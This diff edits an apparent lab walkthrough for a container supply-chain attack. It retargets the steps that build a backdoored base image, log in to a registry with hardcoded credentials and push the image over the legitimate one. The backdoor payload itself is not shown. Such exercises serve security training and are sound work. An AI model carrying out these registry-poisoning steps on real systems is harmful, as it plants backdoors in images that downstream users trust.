@@ -72,7 +72,7 @@ Create a Dockerfile that embeds the backdoor into the golang base image:
 ```bash
 cat > Dockerfile << 'EOF'
 # Start from legitimate Golang Alpine image
-FROM golang:1.25-alpine
+FROM alpine:3.20
 
 # Install our backdoor payload
 COPY backdoor.sh /usr/local/bin/backdoor.sh
@@ -94,7 +94,7 @@ EOF
 ### 1.3 Build the Poisoned Image
 
 ```bash
-podman build -t registry.sc.local:30443/golang:1.25-alpine .
+podman build -t registry.sc.local:30443/alpine:3.20 .
 ```
 
 **Expected output:**
@@ -113,7 +113,7 @@ Successfully tagged registry.sc.local:30443/golang:1.25-alpine:latest
 podman login registry.sc.local:30443 -u sc-admin -p RegistryPass123!
 
 # Push the poisoned base image (overwrites legitimate image)
-podman push registry.sc.local:30443/golang:1.25-alpine
+podman push registry.sc.local:30443/alpine:3.20
 ```
 
 **Expected output:**
